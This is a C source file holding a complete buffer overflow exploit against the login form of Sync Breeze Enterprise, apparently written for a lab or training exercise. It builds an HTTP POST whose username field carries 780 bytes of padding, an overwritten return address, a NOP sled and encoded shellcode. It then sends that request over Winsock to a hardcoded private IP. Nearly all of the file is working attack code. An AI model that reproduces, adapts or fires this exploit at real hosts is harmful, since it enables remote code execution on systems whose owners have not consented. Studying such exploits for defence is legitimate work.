/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.187.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.187.10\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://172.16.116.222/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 781; // the buffer size was not correct it ended at 779, solution increase to 781 to have exactly 780
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; //0x10090c83 

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
  "\xda\xce\xd9\x74\x24\xf4\x5d\xba\x22\xa8\x12\x99\x31\xc9"
"\xb1\x52\x83\xed\xfc\x31\x55\x13\x03\x77\xbb\xf0\x6c\x8b"
"\x53\x76\x8e\x73\xa4\x17\x06\x96\x95\x17\x7c\xd3\x86\xa7"
"\xf6\xb1\x2a\x43\x5a\x21\xb8\x21\x73\x46\x09\x8f\xa5\x69"
"\x8a\xbc\x96\xe8\x08\xbf\xca\xca\x31\x70\x1f\x0b\x75\x6d"
"\xd2\x59\x2e\xf9\x41\x4d\x5b\xb7\x59\xe6\x17\x59\xda\x1b"
"\xef\x58\xcb\x8a\x7b\x03\xcb\x2d\xaf\x3f\x42\x35\xac\x7a"
"\x1c\xce\x06\xf0\x9f\x06\x57\xf9\x0c\x67\x57\x08\x4c\xa0"
"\x50\xf3\x3b\xd8\xa2\x8e\x3b\x1f\xd8\x54\xc9\xbb\x7a\x1e"
"\x69\x67\x7a\xf3\xec\xec\x70\xb8\x7b\xaa\x94\x3f\xaf\xc1"
"\xa1\xb4\x4e\x05\x20\x8e\x74\x81\x68\x54\x14\x90\xd4\x3b"
"\x29\xc2\xb6\xe4\x8f\x89\x5b\xf0\xbd\xd0\x33\x35\x8c\xea"
"\xc3\x51\x87\x99\xf1\xfe\x33\x35\xba\x77\x9a\xc2\xbd\xad"
"\x5a\x5c\x40\x4e\x9b\x75\x87\x1a\xcb\xed\x2e\x23\x80\xed"
"\xcf\xf6\x07\xbd\x7f\xa9\xe7\x6d\xc0\x19\x80\x67\xcf\x46"
"\xb0\x88\x05\xef\x5b\x73\xce\xd0\x34\x56\xd1\xb9\x46\xa8"
"\xec\x82\xce\x4e\x84\xe4\x86\xd9\x31\x9c\x82\x91\xa0\x61"
"\x19\xdc\xe3\xea\xae\x21\xad\x1a\xda\x31\x5a\xeb\x91\x6b"
"\xcd\xf4\x0f\x03\x91\x67\xd4\xd3\xdc\x9b\x43\x84\x89\x6a"
"\x9a\x40\x24\xd4\x34\x76\xb5\x80\x7f\x32\x62\x71\x81\xbb"
"\xe7\xcd\xa5\xab\x31\xcd\xe1\x9f\xed\x98\xbf\x49\x48\x73"
"\x0e\x23\x02\x28\xd8\xa3\xd3\x02\xdb\xb5\xdb\x4e\xad\x59"
"\x6d\x27\xe8\x66\x42\xaf\xfc\x1f\xbe\x4f\x02\xca\x7a\x6f"
"\xe1\xde\x76\x18\xbc\x8b\x3a\x45\x3f\x66\x78\x70\xbc\x82"
"\x01\x87\xdc\xe7\x04\xc3\x5a\x14\x75\x5c\x0f\x1a\x2a\x5d"
"\x1a";


    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
